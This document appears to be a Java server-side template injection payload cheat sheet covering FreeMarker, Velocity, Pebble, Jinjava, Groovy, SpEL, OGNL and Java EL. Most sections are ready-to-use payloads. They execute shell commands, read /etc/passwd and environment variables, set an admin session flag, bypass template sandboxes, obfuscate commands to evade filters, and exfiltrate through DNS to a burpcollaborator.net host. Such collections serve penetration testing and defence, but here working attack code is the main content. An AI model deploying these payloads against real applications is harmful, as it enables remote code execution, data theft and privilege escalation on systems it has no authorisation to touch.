# Server Side Template Injection - Java

> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.

## Summary

- [Templating Libraries](#templating-libraries)
- [Java EL](#java-el)
    - [Java EL - Basic Injection](#java-el---basic-injection)
    - [Java EL - Code Execution](#java-el---code-execution)
- [Freemarker](#freemarker)
    - [Freemarker - Basic Injection](#freemarker---basic-injection)
    - [Freemarker - Read File](#freemarker---read-file)
    - [Freemarker - Code Execution](#freemarker---code-execution)
    - [Freemarker - Code Execution with Obfuscation](#freemarker---code-execution-with-obfuscation)
    - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
- [Jinjava](#jinjava)
    - [Jinjava - Basic Injection](#jinjava---basic-injection)
    - [Jinjava - Command Execution](#jinjava---command-execution)
- [Pebble](#pebble)
    - [Pebble - Basic Injection](#pebble---basic-injection)
    - [Pebble - Code Execution](#pebble---code-execution)
- [Velocity](#velocity)
- [Groovy](#groovy)
    - [Groovy - Basic Injection](#groovy---basic-injection)
    - [Groovy - Read File](#groovy---read-file)
    - [Groovy - HTTP Request:](#groovy---http-request)
    - [Groovy - Command Execution](#groovy---command-execution)
    - [Groovy - Command Execution with Obfuscation](#groovy---command-execution-with-obfuscation)
    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
- [Spring Expression Language](#spring-expression-language)
    - [SpEL - Basic Injection](#spel---basic-injection)
    - [SpEL - Retrieve Environment Variables](#spel---retrieve-environment-variables)
    - [SpEL - Retrieve /etc/passwd](#spel---retrieve-etcpasswd)
    - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
    - [SpEL - Session Attributes](#spel---session-attributes)
    - [SpEL - Command Execution](#spel---command-execution)
- [Object-Graph Navigation Language](#object-graph-navigation-language)
    - [OGNL - Basic Injection](#ognl---basic-injection)
    - [OGNL - Command Execution](#ognl---command-execution)
- [References](#references)

## Templating Libraries

| Template Name | Payload Format         |
|---------------|------------------------|
| Codepen       | `#{ }`                 |
| Freemarker    | `${ }`, `#{ }`, `[= ]` |
| Groovy        | `${ }`                 |
| Jinjava       | `{{ }}`                |
| Pebble        | `{{ }}`                |
| SpEL          | `*{ }`, `#{ }`, `${ }` |
| Thymeleaf     | `[[ ]]`                |
| Velocity      | `#set($X="") $X`       |

## Java EL

### Java EL - Basic Injection

Java has multiple Expression Languages using similar syntax.

> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java EL - Code Execution

```java
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE
${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE
${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE
${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE

```

---

## Freemarker

[Official website](https://freemarker.apache.org/)
> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Freemarker - Basic Injection

The template can be :

- Default: `${3*3}`  
- Legacy: `#{3*3}`
- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)

### Freemarker - Read File

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

### Freemarker - Code Execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]

${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Based RCE
${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
```

### Freemarker - Code Execution with Obfuscation

FreeMarker offers the built-in function: `lower_abc`. This function converts int-based values into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):

If you wanted a string that represents the string: "id", you could use the payload: `${9?lower_abc+4?lower_abc)}`.

Chaining `lower_abc` to perform code execution (command: `id`):

```js
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

### Freemarker - Sandbox Bypass

:warning: only works on Freemarker versions below 2.3.30

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Jinjava

[Official website](https://github.com/HubSpot/jinjava)
> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).

### Jinjava - Basic Injection

```python
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

### Jinjava - Command Execution

Fixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)

```ps1
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Pebble

[Official website](https://pebbletemplates.io/)

> Pebble is a Java templating engine inspired by [Twig](./PHP.md#twig) and similar to the Python [Jinja](./Python.md#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.

### Pebble - Basic Injection

```java
{{ someString.toUPPERCASE() }}
```

### Pebble - Code Execution

Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.

New version of Pebble :

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Velocity

[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)

> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates.

In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo "a" > /tmp/a`. Below is an example with `whoami` in base64:

```java
#set($base64EncodedCommand = 'd2hvYW1p')

#set($contextObjectClass = $knownContextObject.getClass())

#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))

#set($StringClass = $contextObjectClass.forName("java.lang.String"))
#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))

#set($commandArgs = ["/bin/sh", "-c", $command])

#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
#set($processBuilder = $processBuilder.redirectErrorStream(true))
#set($process = $processBuilder.start())
#set($exitCode = $process.waitFor())

#set($inputStream = $process.getInputStream())
#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
#set($scannerDelimiter = $scanner.useDelimiter("\\A"))

#if($scanner.hasNext())
  #set($output = $scanner.next().trim())
  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
#end
```

Error-Based RCE payload:

```java
#set($s="")
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
#set($n=$p.waitFor())
#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
#include($b)
```

Boolean-Based RCE payload:

```java
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#include("Y:/A:/xxx")
#end
```

Time-Based RCE payload:

```java
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))
#end
```

---

## Groovy

[Official website](https://groovy-lang.org/)

### Groovy - Basic injection

Refer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection.

### Groovy - Read File

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP Request

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - Command Execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - Command Execution with Obfuscation

You can bypass security filters by constructing strings from ASCII codes and executing them as system commands.

Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.

Execute system command (command: `id`):

```groovy
${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

### Groovy - Sandbox Bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

or

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Spring Expression Language

> Java EL payloads also work for SpEL

[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)

> The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.

### SpEL - Basic Injection

> SpEL has built-in templating system using #{ }, but SpEL is also commonly used for interpolation using ${ }

```java
${7*7}
${'patt'.toString().replace('a', 'x')}
${T(java.lang.Integer).valueOf('1')}
```

### SpEL - Retrieve Environment Variables

```java
${T(java.lang.System).getenv()}
```

### SpEL - Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

### SpEL - DNS Exfiltration

DNS lookup

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```

### SpEL - Session Attributes

Modify session attributes

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

### SpEL - Command Execution

- Method using `java.lang.Runtime` #1 - accessed with JavaClass

    ```java
    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
    ```

- Method using `java.lang.Runtime` #2

    ```java
    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
    #{session.getAttribute("rtc").setAccessible(true)}
    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
    ```

- Method using `java.lang.Runtime` #3 - accessed with `invoke`

    ```java
    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
    ```

- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`

    ```java
    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
    ```

- Method using `java.lang.ProcessBuilder`

    ```java
    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
    ${request.getAttribute("c").add("cmd.exe")}
    ${request.getAttribute("c").add("/k")}
    ${request.getAttribute("c").add("ping x.x.x.x")}
    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
    ${request.getAttribute("a")}
    ```
- Error-Based payload:
  
    ```java
    ${T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))}
    ```
  
- Boolean-Based payload:
  
    ```java
    ${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
    ```
  
- Time-Based payload:
  
    ```java
    ${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}
    ```

## Object-Graph Navigation Language

[Official website](https://commons.apache.org/dormant/commons-ognl/)

> OGNL stands for Object-Graph Navigation Language; it is an expression language for getting and setting properties of Java objects, plus other extras such as list projection and selection and lambda expressions. You use the same expression for both getting and setting the value of a property.

### OGNL - Basic Injection

> OGNL can be used with different tags like ${ }

```java
7*7
'patt'.toString().replace('a', 'x')
@java.lang.Integer@valueOf('1')
```

### OGNL - Command Execution

Rendered:

```java
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

Error-Based:

```java
(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0
```

Boolean-Based:

```java
1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
```

Time-Based:

```java
((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
```

## References

- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
- [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
